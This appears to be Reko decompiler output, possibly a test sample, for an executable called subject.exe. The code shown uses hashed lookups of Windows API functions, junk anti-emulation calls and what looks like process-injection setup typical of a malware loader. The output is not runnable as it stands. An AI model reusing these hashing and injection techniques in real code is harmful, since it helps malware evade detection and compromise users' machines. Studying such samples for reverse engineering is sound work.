// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register word32 fn00401000(Stack Eq_3 dwArg04, Stack uint32 dwArg08)
word32 fn00401000(HMODULE dwArg04, uint32 dwArg08)
{
	struct Eq_5 * eax_80 = dwArg04 + (&(dwArg04 + (&dwArg04->unused)[0x0F] / 0x04)->unused)[0x001E] / 0x04;
	word16 eax_84[] = dwArg04 + eax_80->dw0024 / 0x04;
	uint32 ebx_122 = dwArg08;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		ebx_122 = dwArg08 + 890899;
	word32 eax_126[] = dwArg04 + eax_80->dw0020 / 0x04;
	word32 eax_131[] = dwArg04 + eax_80->dw001C / 0x04;
	int32 edx_133 = 0x00;
	while (true)
	{
		word32 eax_169;
		if (edx_133 >= eax_80->dw0018)
			break;
		Eq_67 (* eax_214)[] = dwArg04 + eax_126[edx_133] / 0x04;
		dwLoc3C = dwLoc3C & 0x00;
		dwLoc40 = dwLoc40 & 0x00;
		while (Mem0[dwLoc3C + eax_214:byte] != 0x00)
		{
			dwLoc40 = (int32) Mem0[dwLoc3C + eax_214:byte] ^ 33 ^ (dwLoc40 << 0x07 | dwLoc40 >>u 0x19);
			dwLoc3C = dwLoc3C + 0x01;
		}
		if (dwLoc40 == ebx_122)
		{
			eax_169 = dwArg04 + eax_131[(word32) eax_84[edx_133]] / 0x04;
			return eax_169;
		}
		edx_133 = edx_133 + 0x01;
	}
	eax_169 = 0x00;
	return eax_169;
}

// 00401291: void fn00401291()
void fn00401291()
{
	Eq_3 eax_46 = GetModuleHandleA(null);
	ptr32 esp_126;
	word32 ebp_127;
	byte SCZO_128;
	word32 ebx_129;
	word32 esi_130;
	word32 edi_131;
	word32 eax_132;
	word32 edx_133;
	word32 ecx_134;
	bool C_135;
	byte cl_136;
	byte SZO_137;
	globals->ptr404214();
	Eq_110 eax_94 = eax_46 + (&eax_46->unused)[0x0F] / 0x04;
	*(esp_126 - 0x04) = fp - 0x14;
	*(esp_126 - 0x08) = eax_94->dw0050;
	*(esp_126 - 0x0C) = (HMODULE *) eax_46;
	*(esp_126 - 0x10) = eax_132;
	*(esp_126 - 0x14) = globals->dw404204;
	ptr32 esp_199;
	word32 ebp_200;
	byte SCZO_201;
	word32 ebx_202;
	word32 esi_203;
	word32 edi_204;
	word32 eax_205;
	word32 edx_206;
	word32 ecx_207;
	bool C_208;
	byte cl_209;
	byte SZO_210;
	globals->ptr404218();
	globals->dw40421C = 0x00010007;
	*(esp_199 - 0x04) = 4211228;
	*(esp_199 - 0x08) = globals->dw404208;
	ptr32 esp_277;
	word32 ebp_278;
	byte SCZO_279;
	word32 ebx_280;
	word32 esi_281;
	word32 edi_282;
	word32 eax_283;
	word32 edx_284;
	word32 ecx_285;
	bool C_286;
	byte cl_287;
	byte SZO_288;
	globals->ptr4044E8();
	globals->dw4042D4 = 4199934;
	*(esp_277 - 0x04) = 4211228;
	*(esp_277 - 0x08) = globals->dw404208;
	ptr32 esp_342;
	word32 ebp_343;
	byte SCZO_344;
	word32 ebx_345;
	word32 esi_346;
	word32 edi_347;
	word32 eax_348;
	word32 edx_349;
	word32 ecx_350;
	bool C_351;
	byte cl_352;
	byte SZO_353;
	globals->ptr4044EC();
	*(esp_342 - 0x04) = globals->dw404208;
	word32 esp_381;
	word32 ebp_382;
	byte SCZO_383;
	word32 ebx_384;
	word32 esi_385;
	word32 edi_386;
	word32 eax_387;
	word32 edx_388;
	word32 ecx_389;
	bool C_390;
	byte cl_391;
	byte SZO_392;
	globals->ptr4044F0();
}

// 00402001: Register Eq_243 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_3 eax_20 = LoadLibraryA(globals->t404018);
	CloseHandle((void *) 0x55);
	globals->ptr404A18 = fn00401000(eax_20, ~0x06B088C2);
	GetFileType((void *) 0x2E);
	GetModuleHandleA(null);
	globals->ptr404214 = fn00401000(eax_20, 0x25C1455C);
	globals->ptr404218 = fn00401000(eax_20, 0x117F004B);
	globals->ptr4044E8 = fn00401000(eax_20, 0x15635F51);
	globals->ptr4044EC = fn00401000(eax_20, 358840145);
	globals->ptr4044F0 = fn00401000(eax_20, 0xCEE642C0);
	globals->ptr404A08 = fn00401000(eax_20, 4074194022);
	globals->ptr404A1C = fn00401000(eax_20, 553318114);
	globals->ptr4044F4 = fn00401000(eax_20, 0x7DC27DDD);
	GetModuleFileNameA(null, &globals->t404A20, 0x0104);
	lstrcpyA(&globals->t404904, globals->t40402C);
	lstrcatA(&globals->t404904, globals->t404000);
	lstrcatA(&globals->t404904, globals->t404014);
	lstrcatA(&globals->t404904, &globals->t404A20);
	globals->dw404B24 = 0x44;
	globals->dw404B50 = 0x01;
	globals->w404B54 = 0x02;
	ptr32 esp_549;
	word32 ebp_550;
	byte SCZO_551;
	word32 ebx_552;
	word32 esi_553;
	word32 edi_554;
	word32 eax_555;
	word32 edx_556;
	word32 ecx_557;
	byte cl_558;
	byte SZO_559;
	bool C_560;
	globals->ptr404A18();
	*(esp_549 - 0x04) = globals->dw404010;
	ptr32 esp_589;
	word32 ebp_590;
	byte SCZO_591;
	word32 ebx_592;
	word32 esi_593;
	word32 edi_594;
	word32 eax_595;
	word32 edx_596;
	word32 ecx_597;
	byte cl_598;
	byte SZO_599;
	bool C_600;
	globals->ptr4044F4();
	*(esp_589 - 0x04) = 0x00311330;
	*(esp_589 - 0x08) = eax_595;
	globals->ptr4048F8 = fn00401000(dwArg00, dwArg04);
	*(esp_589 - 0x04) = 0xBF27C02C;
	*(esp_589 - 0x08) = eax_595;
	globals->ptr4048FC = fn00401000(dwArg00, dwArg04);
	*(esp_589 - 0x04) = 117637656;
	*(esp_589 - 0x08) = eax_595;
	globals->ptr404900 = fn00401000(dwArg00, dwArg04);
	*(esp_589 - 0x04) = 2774504988;
	*(esp_589 - 0x08) = eax_595;
	globals->ptr404A0C = fn00401000(dwArg00, dwArg04);
	*(esp_589 - 0x04) = 0x9CCB447A;
	*(esp_589 - 0x08) = eax_595;
	globals->ptr404A14 = fn00401000(dwArg00, dwArg04);
	*(esp_589 - 0x04) = globals->dw404028;
	ptr32 esp_779;
	word32 ebp_780;
	byte SCZO_781;
	word32 ebx_782;
	word32 esi_783;
	word32 edi_784;
	word32 eax_785;
	word32 edx_786;
	word32 ecx_787;
	byte cl_788;
	byte SZO_789;
	bool C_790;
	globals->ptr4044F4();
	*(esp_779 - 0x04) = 3765777762;
	*(esp_779 - 0x08) = eax_785;
	globals->ptr404A10 = fn00401000(dwArg00, dwArg04);
	fn00401291();
	*(esp_779 - 0x04) = 0x00;
	word32 esp_884;
	word32 ebp_885;
	byte SCZO_886;
	word32 ebx_887;
	word32 esi_888;
	word32 edi_889;
	word32 eax_890;
	word32 edx_891;
	word32 ecx_892;
	byte cl_893;
	byte SZO_894;
	bool C_895;
	globals->ptr404A1C();
	return 0x00;
}

